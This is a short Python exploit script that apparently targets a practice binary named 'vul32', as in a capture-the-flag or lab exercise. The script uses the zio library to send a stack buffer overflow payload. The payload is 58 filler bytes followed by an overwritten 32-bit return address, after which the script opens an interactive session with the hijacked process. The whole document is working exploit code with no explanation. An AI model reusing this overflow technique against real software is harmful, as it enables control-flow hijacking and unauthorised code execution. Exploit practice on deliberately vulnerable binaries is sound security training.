#! /usr/bin/python
from zio import *

addr = "\x3a\x86\x04\x08"

io = zio('./vul32')
code = "a" * 58 + addr+"1234"


io.write(code)
io.interact()

